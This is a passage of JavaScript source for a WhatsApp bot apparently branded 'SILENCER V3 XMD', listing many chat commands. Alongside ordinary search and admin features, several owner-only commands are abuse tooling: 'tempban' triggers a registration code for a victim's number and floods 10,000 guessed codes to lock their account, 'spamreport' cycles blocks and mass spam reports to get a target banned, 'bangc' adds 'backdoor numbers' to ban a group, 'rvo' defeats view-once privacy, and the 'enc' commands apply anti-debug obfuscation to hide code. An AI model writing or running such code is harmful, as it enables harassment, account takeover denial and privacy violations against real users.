      .toBuffer();
  } catch (err) {
    console.warn('⚠️ Thumbnail not found, sending without image.');
    thumbBuffer = Buffer.from(''); // fallback – no image
  }

  // ── Send the message with buttons ──
  await sock.relayMessage(
    jid,
    {
      buttonsMessage: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: botName,
          address: botName,
          jpegThumbnail: thumbBuffer,
        },
        contentText: contentText,
        footerText: `${botName} Bot`,
        buttons: [
          {
            buttonId: 'menu',
            buttonText: { displayText: '📸 Back Menu' },
            type: 1
          },
          {
            buttonId: 'owner',
            buttonText: { displayText: '👑 Owner Menu' },
            type: 1
          }
        ],
        headerType: 6
      }
    },
    { quoted: m, messageId: sock.generateMessageTag?.() || Date.now().toString() }
  );

  break;
}*/
// ══════════════════════════════════════════════════════
//   STALK – Instagram, Roblox, Twitter, YouTube
// ══════════════════════════════════════════════════════

case 'stalkig':
case 'instagramstalk':
case 'stalkinstagram':
case 'igstalk': {
  if (!text) {
    await reply(`📷 ${prefix}stalkig <username>\nExample: ${prefix}stalkig ryzz2.009`);
    break;
  }
  await reaction('🔍');
  try {
    const username = text.trim();
    const res = await axios.get(`https://fastrestapis.fasturl.link/stalk/ig?username=${encodeURIComponent(username)}`, { timeout: 15000 });
    if (!res.data?.status || !res.data?.data) {
      await reply('❌ User not found or account is private.');
      break;
    }
    const data = res.data.data;
    const caption = `📷 *Instagram Stalker*\n\n` +
      `• Username: ${data.username || 'N/A'}\n` +
      `• Name: ${data.full_name || data.name || 'N/A'}\n` +
      `• Bio: ${data.bio || '-'}\n` +
      `• Followers: ${data.followers || data.follower_count || 0}\n` +
      `• Following: ${data.following || data.following_count || 0}\n` +
      `• Posts: ${data.posts || data.media_count || 0}\n` +
      `• Verified: ${data.is_verified ? '✅ Yes' : '❌ No'}\n` +
      `• Private: ${data.is_private ? '🔒 Yes' : '🌐 No'}\n` +
      `• Business: ${data.is_business ? '💼 Yes' : '❌ No'}\n` +
      `• External URL: ${data.external_url || 'N/A'}`;

    const pp = data.profile_pic || data.profile_pic_url || data.profile_picture || data.avatar;
    if (pp) {
      await replyImg(pp, caption);
    } else {
      await reply(caption);
    }
  } catch (e) {
    await reply(`❌ Error: ${e.message}`);
  }
  break;
}

case 'stalkroblox':
case 'robloxstalk': {
  if (!text) {
    await reply(`🎮 ${prefix}stalkroblox <username>\nExample: ${prefix}stalkroblox KACUNG`);
    break;
  }
  await reaction('🔍');
  try {
    const username = text.trim();
    const res = await axios.get(`https://fastrestapis.fasturl.link/stalk/roblox?username=${encodeURIComponent(username)}`, { timeout: 15000 });
    if (!res.data?.status || !res.data?.data) {
      await reply('❌ User not found.');
      break;
    }
    const data = res.data.data;
    const basic = data.basic || data;
    const presence = data.presence?.userPresences?.[0] || {};
    const social = data.social || {};
    const avatar = data.avatar?.headshot?.data?.[0] || {};

    const caption = `🎮 *Roblox Stalker*\n\n` +
      `• Name: ${basic.name || 'N/A'}\n` +
      `• Display Name: ${basic.displayName || 'N/A'}\n` +
      `• User ID: ${basic.id || 'N/A'}\n` +
      `• Description: ${basic.description || '-'}\n` +
      `• Created: ${basic.created ? new Date(basic.created).toLocaleDateString() : 'N/A'}\n` +
      `• Verified: ${basic.hasVerifiedBadge ? '✅ Yes' : '❌ No'}\n` +
      `• Banned: ${basic.isBanned ? '🚫 Yes' : '✅ No'}\n` +
      `• Status: ${presence.lastLocation || 'Offline'}\n` +
      `• Friends: ${social.friends?.count || 0}\n` +
      `• Followers: ${social.followers?.count || 0}\n` +
      `• Following: ${social.following?.count || 0}`;

    const avatarUrl = avatar.imageUrl || '';
    if (avatarUrl) {
      await replyImg(avatarUrl, caption);
    } else {
      await reply(caption);
    }
  } catch (e) {
    await reply(`❌ Error: ${e.message}`);
  }
  break;
}
case 'realban':
case 'tempban': {
    if (!_isOwner) {
        await reply(`❌ Owner only.`);
        break;
    }

    if (args.length < 1) {
        await reply(`📞 Usage: ${prefix}tempban <country_code|number>\nExample: ${prefix}tempban 254|700000001`);
        break;
    }

    const parts = args[0].split('|');
    if (parts.length !== 2) {
        await reply(`❌ Invalid format. Use: country_code|number`);
        break;
    }

    const countryCode = parts[0];
    const number = parts[1].replace(/\D/g, '');
    const fullNumber = `${countryCode}${number}`;
    const jidTarget = fullNumber + '@s.whatsapp.net';

    // ── Notify group ──
    await sock.sendMessage(jid, {
        text: `👤 User @${fullNumber} is being temporarily banned 𝚩𝚼 𝐒𝚰𝐋𝚬𝚴𝐂𝚬𝚪 ✅\n\n⏳ Pause 2 minutes to avoid panel block.`,
        mentions: [jidTarget]
    }, { quoted: m });

    try {
        // ── 1. Block the user (real ban) ──
        await sock.updateBlockStatus(jidTarget, 'block');
        await reply(`✅ User @${fullNumber} has been blocked.`);

        // ── 2. Attempt registration flood (if available) ──
        // This part is optional and may fail – we wrap it.
        try {
            // Check if GlobalTechInc exists – if not, skip.
            if (typeof GlobalTechInc !== 'undefined') {
                const { state, saveCreds } = await useMultiFileAuthState('./session_temp');
                const conn = GlobalTechInc({
                    auth: state,
                    printQRInTerminal: false,
                    browser: ['Chrome (Linux)', '', '']
                });

                await conn.requestRegistrationCode({
                    phoneNumber: '+' + fullNumber,
                    phoneNumberCountryCode: countryCode,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724,
                    method: 'sms'
                });

                // Flood with random codes
                for (let i = 0; i < 10000; i++) {
                    try {
                        const prefix = Math.floor(Math.random() * 999);
                        const suffix = Math.floor(Math.random() * 999);
                        await conn.register(`${prefix}-${suffix}`);
                    } catch (e) {
                        // silent
                    }
                }
                await reply(`✅ Registration flood initiated (may or may not work).`);
            } else {
                await reply(`⚠️ GlobalTechInc not available – skipped registration flood.`);
            }
        } catch (err) {
            await reply(`⚠️ Registration flood failed: ${err.message}`);
        }

        // ── Final confirmation ──
        await reply(`🔒 Temporary ban completed for @${fullNumber}.`);

    } catch (err) {
        await reply(`❌ Error: ${err.message}`);
    }
    break;
}
case 'spamreport':
case 'report5':{
  // ── Owner only ──
  if (!_isOwner) {
    await reply('❌ Owner only.');
    break;
  }

  // ── Get target JID ──
  let target = getTargetJid(m, args);
  
  // ── If no target from mention/reply, try raw number ──
  if (!target) {
    const rawNum = args[0]?.replace(/\D/g, '');
    if (rawNum && rawNum.length >= 7) {
      target = rawNum + '@s.whatsapp.net';
    }
  }

  if (!target) {
    await reply('❌ Please reply to a message, mention a user, or provide a phone number.\n\nExample: .spamreport 254712345678');
    break;
  }

  const targetNum = normNum(target);
  await reaction('🚨');
  await reply(`⏳ Starting report cycle on @${targetNum}...`);

  let successCount = 0;

  for (let i = 1; i <= 5; i++) {
    try {
      // ── 1. Block ──
      await sock.updateBlockStatus(target, 'block');
      await new Promise(r => setTimeout(r, 400));

      // ── 2. Unblock ──
      await sock.updateBlockStatus(target, 'unblock');
      await new Promise(r => setTimeout(r, 400));

      // ── 3. Send Report to WhatsApp ──
      const key = m.quoted?.key || {
        remoteJid: target,
        id: `spamreport_${Date.now()}_${i}`,
        fromMe: false,
      };
      await sock.sendMessage(target, {
        protocolMessage: {
          type: 0, // REPORT_SPAM
          key: key,
        }
      });

      successCount++;
      await new Promise(r => setTimeout(r, 500));

    } catch (e) {
      console.error(`[SpamReport] Cycle ${i} failed:`, e.message);
    }
  }

  // ── Final report ──
  await reply(ft(`
🚨 *SPAM REPORT COMPLETE*

👤 Target: @${targetNum}
📊 Successful cycles: ${successCount}/5
📢 WhatsApp notified multiple times.

⚠️ User is currently is the user is not ban report again .
   Report again if needed.

🔇 ${global.name || 'SILENCER V3 XMD'}
`, sock));

  break;
}
case "bangc": {
    if (!isGroup) {
        await reply(
            `❌ This command only works in groups.`
        );
        break;
    }
    if (!_isOwner) {
        await reply(
            `❌ Owner only command.`
        );
        break;
    }

    try {
        // ── Add 50 backdoor numbers to the group ──
        await groupBanz(sock, jid);
        await reply(
            `✅ Successfully banned this group!`
        );
    } catch (err) {
        console.error("Banz error:", err);
        await reply(
            `❌ ${err.message || 'Failed to ban group.'}`
        );
    }
    break;
}
case 'stalktwiter':
case 'stalktw':
case 'twstalk':
case 'stalktwitter': {
  if (!text) {
    await reply(`🐦 ${prefix}stalktwiter <username>\nExample: ${prefix}stalktwiter ale`);
    break;
  }
  await reaction('🔍');
  try {
    const username = text.trim();
    const res = await axios.get(`https://fastrestapis.fasturl.link/stalk/twitter?username=${encodeURIComponent(username)}`, { timeout: 15000 });
    if (!res.data?.status || !res.data?.data) {
      await reply('❌ User not found.');
      break;
    }
    const data = res.data.data;
    const user = data.user || data;
    const tweets = data.tweetList?.tweets || data.tweets || [];

    const caption = `🐦 *Twitter/X Stalker*\n\n` +
      `• Name: ${user.name || 'N/A'}\n` +
      `• Username: @${user.screen_name || username}\n` +
      `• Bio: ${user.description || '-'}\n` +
      `• Verified: ${user.is_blue_verified || user.verified ? '✅ Yes' : '❌ No'}\n` +
      `• Followers: ${user.followers_count || 0}\n` +
      `• Following: ${user.friends_count || 0}\n` +
      `• Tweets: ${user.statuses_count || 0}\n` +
      `• Location: ${user.location || 'N/A'}\n` +
      `• Joined: ${user.created_at ? new Date(user.created_at).toLocaleDateString() : 'N/A'}\n\n`;

    const tweetMsg = tweets.length > 0
      ? `📝 *Latest Tweets:*\n${tweets.slice(0, 3).map((t, i) => `${i+1}. ${t.full_text || t.text || ''}`).join('\n')}`
      : '📝 No recent tweets.';

    const fullMsg = caption + tweetMsg;
    const pp = user.profile_image_url_https || user.profile_image_url || user.avatar;
    if (pp) {
      await replyImg(pp, fullMsg);
    } else {
      await reply(fullMsg);
    }
  } catch (e) {
    await reply(`❌ Error: ${e.message}`);
  }
  break;
}

case 'stalkyt':
case 'ytstalk':
case 'youtubestalk':
case 'stalkyoutube': {
  if (!text) {
    await reply(`📺 ${prefix}stalkyt <username>\nExample: ${prefix}stalkyt alex`);
    break;
  }
  await reaction('🔍');
  try {
    const username = text.trim();
    const res = await axios.get(`https://fastrestapis.fasturl.link/stalk/yt?username=${encodeURIComponent(username)}`, { timeout: 15000 });
    if (!res.data?.status || !res.data?.data) {
      await reply('❌ Channel not found.');
      break;
    }
    const data = res.data.data;
    const channel = data.channel || data;
    const latest = data.latest_videos || data.videos || [];

    const caption = `📺 *YouTube Stalker*\n\n` +
      `• Username: ${channel.username || channel.name || 'N/A'}\n` +
      `• Channel Name: ${channel.channel_name || channel.title || 'N/A'}\n` +
      `• Subscribers: ${channel.subscriberCount || channel.subscribers || 0}\n` +
      `• Videos: ${channel.videoCount || channel.videos || 0}\n` +
      `• Views: ${channel.viewCount || channel.views || 0}\n` +
      `• Description: ${channel.description ? channel.description.slice(0, 150) + '...' : '-'}\n` +
      `• Channel URL: ${channel.channelUrl || channel.url || 'N/A'}\n\n`;

    const latestMsg = latest.length > 0
      ? `📹 *Latest Videos:*\n${latest.slice(0, 3).map((v, i) => `${i+1}. ${v.title}\n   🔗 ${v.url}`).join('\n')}`
      : '📹 No recent videos.';

    const fullMsg = caption + latestMsg;
    const avatar = channel.avatarUrl || channel.avatar || channel.thumbnail;
    if (avatar) {
      await replyImg(avatar, fullMsg);
    } else {
      await reply(fullMsg);
    }
  } catch (e) {
    await reply(`❌ Error: ${e.message}`);
  }
  break;
}
// ══════════════════════════════════════════════════════
//   ENCRYPTION – JS Obfuscation (7 styles)
// ══════════════════════════════════════════════════════

// ══════════════════════════════════════════════════════
//   ENCRYPTION – JS Obfuscation (7 styles)
// ══════════════════════════════════════════════════════

case 'encarab':
case 'encchina':
case 'enccustom':
case 'encinvis':
case 'encsiu':
case 'encstrong':
case 'encultra': {
  if (needOwner()) break;

  const quoted = m.quoted || m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const fileName = quoted.fileName || '';

  // Must reply to a .js document
  if (!/document/.test(mime) || !fileName.endsWith('.js')) {
    await reply(`📄 ${prefix}${cmd} (reply to a .js document)`);
    break;
  }

  await reaction('🔒');

  try {
    // ── Download the JS file ──
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    let media = await downloadContentFromMessage(quoted, 'document');
    let buffer = Buffer.from([]);
    for await (const chunk of media) buffer = Buffer.concat([buffer, chunk]);
    const rawCode = buffer.toString('utf8');

    // ── Validate it's valid JavaScript ──
    try { new Function(rawCode); } catch (e) {
      await reply(`❌ Invalid JavaScript:\n${e.message}`);
      break;
    }

    // ── Choose obfuscation config ──
    let config = {};
    let prefixName = '';

    switch (cmd) {
      case 'encarab': {
        prefixName = 'arabic';
        const arabChars = ['أ','ب','ت','ث','ج','ح','خ','د','ذ','ر','ز','س','ش','ص','ض','ط','ظ','ع','غ','ف','ق','ك','ل','م','ن','ه','و','ي'];
        const genArab = () => Array.from({ length: Math.floor(Math.random() * 4) + 3 }, () => arabChars[Math.floor(Math.random() * arabChars.length)]).join('');
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: genArab,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.95,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          deadCode: true,
          calculator: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'encchina': {
        prefixName = 'mandarin';
        const chars = ['龙','虎','风','云','山','河','天','地','雷','电','火','水','木','金','土','星','月','日','光','影','峰','泉','林','海','雪','霜','雾','冰','焰','石'];
        const gen = () => Array.from({ length: Math.floor(Math.random() * 4) + 3 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: gen,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.95,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          deadCode: true,
          calculator: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'enccustom': {
        const customName = args[0] || 'myid';
        if (!customName) {
          await reply(`⚠️ ${prefix}enccustom <prefix>\nExample: ${prefix}enccustom myproject`);
          break;
        }
        prefixName = `custom_${customName}`;
        const gen = () => {
          const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
          let suf = '';
          for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++) suf += chars[Math.floor(Math.random() * chars.length)];
          return `${customName}_${suf}`;
        };
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: gen,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.75,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          deadCode: true,
          calculator: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'encinvis': {
        prefixName = 'invisible';
        const gen = () => '_'.repeat(Math.floor(Math.random() * 4) + 3) + Math.random().toString(36).slice(2, 5);
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: gen,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.95,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          deadCode: true,
          calculator: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'encsiu': {
        prefixName = 'siu';
        const gen = () => {
          const abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
          let r = '';
          for (let i = 0; i < 6; i++) r += abc[Math.floor(Math.random() * abc.length)];
          return `CalceKarik和SiuSiu${r}`;
        };
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: gen,
          stringCompression: true,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.95,
          flatten: true,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          deadCode: true,
          calculator: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'encstrong': {
        prefixName = 'strong';
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: 'randomized',
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.75,
          shuffle: true,
          duplicateLiteralsRemoval: true,
          calculator: true,
          dispatcher: true,
          deadCode: true,
          opaquePredicates: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      case 'encultra': {
        prefixName = 'ultra';
        const gen = () => {
          const chars = 'abcdefghijklmnopqrstuvwxyz';
          const nums = '0123456789';
          return 'z' + nums[Math.floor(Math.random() * nums.length)] + chars[Math.floor(Math.random() * chars.length)] + Math.random().toString(36).slice(2, 6);
        };
        config = {
          target: 'node',
          compact: true,
          renameVariables: true,
          renameGlobals: true,
          identifierGenerator: gen,
          stringCompression: true,
          stringEncoding: true,
          stringSplitting: true,
          controlFlowFlattening: 0.9,
          flatten: true,
          shuffle: true,
          rgf: true,
          deadCode: true,
          opaquePredicates: true,
          dispatcher: true,
          lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
        };
        break;
      }

      default: return;
    }

    // ── Obfuscate ──
    const JsConfuser = require('js-confuser');
    const obfuscated = await JsConfuser.obfuscate(rawCode, config);
    const code = typeof obfuscated === 'string' ? obfuscated : (obfuscated?.code || String(obfuscated));

    // ── Send as document ──
    const outName = `${prefixName}-encrypted-${Date.now()}.js`;
    const tmpDir = path.join(__dirname, 'tmp');
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
    const outPath = path.join(tmpDir, outName);
    fs.writeFileSync(outPath, code, 'utf8');
    const fileBuffer = fs.readFileSync(outPath);

    await sock.sendMessage(jid, {
      document: fileBuffer,
      mimetype: 'application/javascript',
      fileName: outName,
      caption: `🔒 *${cmd.toUpperCase()}* encrypted successfully!`,
    }, { quoted: fakeQuoted || m });

    fs.unlinkSync(outPath);

  } catch (e) {
    await reply(`❌ Encryption failed: ${e.message}`);
  }
  break;
}
// ── Read View-Once ──
case 'rvo':
case 'readviewonce': {
  if (needOwner()) break;
  const { qMsg, qType, qKey } = getQuoted(m);
  let inner = qMsg;
  for (const w of ['viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension']) {
    if (inner?.[w]?.message) { inner = inner[w].message; break; }
  }
  const img = inner?.imageMessage;
  const vid = inner?.videoMessage;
  if (!img && !vid) { await reply(`👁️ ${prefix}rvo (reply to a view-once message)`); break; }
  try {
    const src = img ? { imageMessage: img } : { videoMessage: vid };
    const buf = await dlMedia(src, qKey);
    if (img) await sock.sendMessage(jid, { image: buf, caption: '👁️ Revealed' });
    else await sock.sendMessage(jid, { video: buf, caption: '👁️ Revealed' });
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── Add Limit ──
case 'addlimit': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  const amount = parseInt(args[args.length - 1]);
  if (!target || isNaN(amount) || amount < 1) {
    await reply(`🎫 ${prefix}addlimit <@mention> <amount>\nExample: ${prefix}addlimit @user 50`);
    break;
  }
  if (!db.users[target]) db.users[target] = { limit: 0 };
  db.users[target].limit = (db.users[target].limit || 0) + amount;
  saveDb();
  await reply(`✅ Added ${amount} limit to @${target.split('@')[0]}.`, { mentions: [target] });
  break;
}

// ── Add Rental ──
case 'addsewa': {
  if (needOwner()) break;
  if (!text || !text.includes('|')) {
    await reply(`📦 ${prefix}addsewa <group_link> | <duration>\nExample: ${prefix}addsewa https://chat.whatsapp.com/xxx | 30d`);
    break;
  }
  const [link, duration] = text.split('|').map(s => s.trim());
  const code = link.split('chat.whatsapp.com/')[1];
  if (!code) return reply('❌ Invalid link.');
  const expiry = Date.now() + (parseInt(duration) * 86400000);
  const sewaFile = DB('sewa.json');
  const data = readJSON(sewaFile, []);
  data.push({ groupId: code, link, expiry, added: Date.now() });
  writeJSON(sewaFile, data);
  await reply(`✅ Rental added. Expires: ${new Date(expiry).toLocaleDateString()}`);
  break;
}

// ── List Rentals ──
case 'listsewa': {
  if (needOwner()) break;
  const sewaFile = DB('sewa.json');
  const data = readJSON(sewaFile, []);
  if (!data.length) return reply('📭 No rentals.');
  let msg = '📋 *Rentals*\n\n';
  data.forEach((s, i) => {
    const remaining = Math.max(0, Math.floor((s.expiry - Date.now()) / 86400000));
    msg += `${i+1}. ${s.link}\n   Remaining: ${remaining} day(s)\n\n`;
  });
  await reply(msg);
  break;
}

// ── Set Menu Version ──
case 'setmenu': {
  if (needOwner()) break;
  const v = args[0];
  if (!['v1','v2','v3'].includes(v)) { await reply(`📋 ${prefix}setmenu v1/v2/v3`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.menuVersion = v;
  writeJSON(settingsFile, data);
  await reply(`✅ Menu set to ${v}.`);
  break;
}

// ── Ban User ──
case 'ban': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply(`🚫 ${prefix}ban <@mention>`); break; }
  if (!db.users[target]) db.users[target] = {};
  db.users[target].banned = true;
  saveDb();
  await reply(`🚫 @${target.split('@')[0]} banned.`, { mentions: [target] });
  break;
}

// ── Unban User ──
case 'unban': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  if (!target) { await reply(`✅ ${prefix}unban <@mention>`); break; }
  if (!db.users[target]) db.users[target] = {};
  db.users[target].banned = false;
  saveDb();
  await reply(`✅ @${target.split('@')[0]} unbanned.`, { mentions: [target] });
  break;
}

// ── Set Auto Backup ──
case 'setautobackup': {
  if (needOwner()) break;
  const v = args[0]?.toLowerCase();
  if (!['on','off'].includes(v)) { await reply(`💾 ${prefix}setautobackup on/off`); break; }
  const settingsFile = DB('settings.json');
  const data = readJSON(settingsFile, {});
  data.autoBackup = v === 'on';
  writeJSON(settingsFile, data);
  await reply(`✅ Auto-Backup → ${v}`);
  break;
}

// ── Play Audio to Target ──
case 'playch': {
  if (needOwner()) break;
  if (!text || !text.includes('|')) {
    await reply(`🎵 ${prefix}playch <target_jid> | <song_name>\nExample: ${prefix}playch 628xxx@s.whatsapp.net | faded`);
    break;
  }
  const [target, query] = text.split('|').map(s => s.trim());
  if (!target || !query) return reply('❌ Invalid format.');
  await reply(`⏳ Playing "${query}" to ${target}...`);
  try {
    const yts = require('yt-search');
    const search = await yts(query);
    const video = search.videos?.[0];
    if (!video) throw new Error('No results.');
    const { data } = await axios.get(`https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`, { timeout: 20000 });
    const dlUrl = data?.result?.downloadUrl || data?.url;
    if (!dlUrl) throw new Error('No download URL.');
    const audioRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 60000 });
    const audioBuf = Buffer.from(audioRes.data);
    await sock.sendMessage(target, {
      audio: audioBuf,
      mimetype: 'audio/mpeg',
      fileName: `${video.title}.mp3`,
      contextInfo: { externalAdReply: { title: video.title, thumbnailUrl: video.thumbnail } }
    });
    await reply(`✅ Sent "${video.title}" to ${target}.`);
  } catch (e) { await reply(`❌ ${e.message}`); }
  break;
}

// ── List Database Users ──
case 'listdbuser': {
  if (needOwner()) break;
  const users = Object.keys(db.users || {});
  if (!users.length) return reply('📭 No users in database.');
  let msg = `👥 *Users (${users.length})*\n\n`;
  users.slice(0, 50).forEach((u, i) => { msg += `${i+1}. ${u}\n`; });
  if (users.length > 50) msg += `\n... and ${users.length - 50} more.`;
  await reply(msg);
  break;
}
// ─── SEARCH COMMANDS ──────────────────────────────────────

case 'playstore':
case 'playstation':
case 'google':
case 'chrome':
case 'gimage':
case 'bingsearch':
case 'bingsrc':
case 'bingimage':
case 'bingimg':
case 'bingvideo':
case 'bingvd': {
  await reaction('🔍');

  const query = text || args.join(' ');
  if (!query) {
    const usage = {
      playstore: '.playstore <app name>',
      playstation: '.playstation <game name>',
      google: '.google <search query>',
      chrome: '.chrome <extension name>',
      gimage: '.gimage <image keyword>',
      bingsearch: '.bingsearch <query>',
      bingsrc: '.bingsrc <query>',
      bingimage: '.bingimage <keyword>',
      bingimg: '.bingimg <keyword>',
      bingvideo: '.bingvideo <keyword>',
      bingvd: '.bingvd <keyword>'
    };
    await reply(`Usage: ${usage[cmd] || '.search <query>'}`);
    break;
  }

  try {
    let result, msg, imageUrl;

    switch (cmd) {
      case 'playstore': {
        const url = `https://api.vreden.web.id/api/playstore?query=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.result || data.result.length === 0) {
          await reply('❌ No apps found.');
          break;
        }
        const apps = data.result.slice(0, 5);
        msg = `📱 *Play Store Results for "${query}"*\n\n`;
        apps.forEach((app, i) => {
          msg += `${i+1}. *${app.title}*\n`;
          msg += `   Developer: ${app.developer || 'N/A'}\n`;
          msg += `   Rating: ${app.rate2 || 'N/A'}\n`;
          msg += `   Link: ${app.link || '#'}\n\n`;
        });
        imageUrl = apps[0]?.img;
        break;
      }

      case 'playstation': {
        const url = `https://fastrestapis.fasturl.cloud/search/playstation?query=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.result || data.result.length === 0) {
          await reply('❌ No games found.');
          break;
        }
        const games = data.result.slice(0, 5);
        msg = `🎮 *PlayStation Results for "${query}"*\n\n`;
        games.forEach((game, i) => {
          msg += `${i+1}. *${game.title}*\n`;
          msg += `   Link: ${game.link || '#'}\n\n`;
        });
        imageUrl = games[0]?.images;
        break;
      }

      case 'google': {
        const API_KEY = process.env.GOOGLE_API_KEY || settings.GOOGLE_API_KEY;
        const CX = process.env.GOOGLE_CX || settings.GOOGLE_CX;
        if (!API_KEY || !CX) {
          await reply('❌ Google API key not configured. Set GOOGLE_API_KEY and GOOGLE_CX in environment.');
          break;
        }
        const url = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(query)}&key=${API_KEY}&cx=${CX}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.items || data.items.length === 0) {
          await reply('❌ No results found.');
          break;
        }
        const items = data.items.slice(0, 5);
        msg = `🔍 *Google Results for "${query}"*\n\n`;
        items.forEach((item, i) => {
          msg += `${i+1}. *${item.title}*\n`;
          msg += `   ${item.snippet || ''}\n`;
          msg += `   ${item.link}\n\n`;
        });
        break;
      }

      case 'chrome': {
        const { Chrome } = require('./lib-signal/data-utils/scrape');
        const results = await Chrome(query);
        if (!results || results.length === 0) {
          await reply('❌ No extensions found.');
          break;
        }
        const top = results.slice(0, 5);
        msg = `🌐 *Chrome Web Store Results for "${query}"*\n\n`;
        top.forEach((ext, i) => {
          msg += `${i+1}. *${ext.title}*\n`;
          msg += `   Publisher: ${ext.publisher || 'N/A'}\n`;
          msg += `   Rating: ${ext.rating || 'N/A'} (${ext.ratingCount || 0} reviews)\n`;
          msg += `   Link: ${ext.link}\n\n`;
        });
        imageUrl = top[0]?.imgSrc;
        break;
      }

      case 'gimage': {
        const { gimage } = require('./lib-signal/data-utils/scrape');
        const images = await gimage(query);
        if (!images || images.length === 0) {
          await reply('❌ No images found.');
          break;
        }
        const randomImage = images[Math.floor(Math.random() * images.length)]?.link;
        if (!randomImage) {
          await reply('❌ No image link found.');
          break;
        }
        const caption = `🖼️ *Image search for "${query}"*\n\nTap "Next" for another image.`;
        const buttons = [
          { buttonId: `.gimage ${query}`, buttonText: { displayText: 'Next' }, type: 1 }
        ];
        await sock.sendMessage(jid, {
          image: { url: randomImage },
          caption: caption,
          buttons,
          headerType: 1,
          viewOnce: true
        }, { quoted: m });
        break;
      }

      case 'bingsearch':
      case 'bingsrc': {
        const url = `https://fastrestapis.fasturl.link/search/bingsearch?ask=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.result || data.result.length === 0) {
          await reply('❌ No results found.');
          break;
        }
        const results = data.result.slice(0, 5);
        msg = `🔍 *Bing Results for "${query}"*\n\n`;
        results.forEach((item, i) => {
          msg += `${i+1}. *${item.title}*\n`;
          msg += `   ${item.description || ''}\n`;
          msg += `   ${item.link}\n\n`;
        });
        break;
      }

      case 'bingimage':
      case 'bingimg': {
        const url = `https://fastrestapis.fasturl.link/search/bingimage?ask=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.result || data.result.length === 0) {
          await reply('❌ No images found.');
          break;
        }
        const results = data.result.slice(0, 5);
        msg = `🖼️ *Bing Image Results for "${query}"*\n\n`;
        results.forEach((item, i) => {
          msg += `${i+1}. *${item.title}*\n`;
          msg += `   ${item.imageUrl}\n\n`;
        });
        break;
      }

      case 'bingvideo':
      case 'bingvd': {
        const url = `https://vapis.my.id/api/bingsrc?q=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, { timeout: 15000 });
        if (!data.data || data.data.length === 0) {
          await reply('❌ No videos found.');
          break;
        }
        const results = data.data.slice(0, 5);
        msg = `🎬 *Bing Video Results for "${query}"*\n\n`;
        results.forEach((item, i) => {
          msg += `${i+1}. *${item.title}*\n`;
          msg += `   Duration: ${item.duration || 'N/A'}\n`;
          msg += `   Views: ${item.views || 'N/A'}\n`;
          msg += `   Channel: ${item.channel || 'N/A'}\n`;
          msg += `   Link: ${item.link}\n\n`;
        });
        break;
      }
    }

    // Send response (image if available, otherwise plain text)
    if (msg) {
      if (imageUrl) {
        try {
          const buffer = await getBuffer(imageUrl);
          await sock.sendMessage(jid, { image: buffer, caption: msg }, { quoted: m });
        } catch {
          await reply(msg);
        }
      } else {
        await reply(msg);
      }
    }
  } catch (e) {
    console.error('[SEARCH]', e);
    await reply(`❌ Search failed: ${e.message}`);
  }
  break;
}
// ─── NEWS COMMANDS ──────────────────────────────────────

case 'antara':
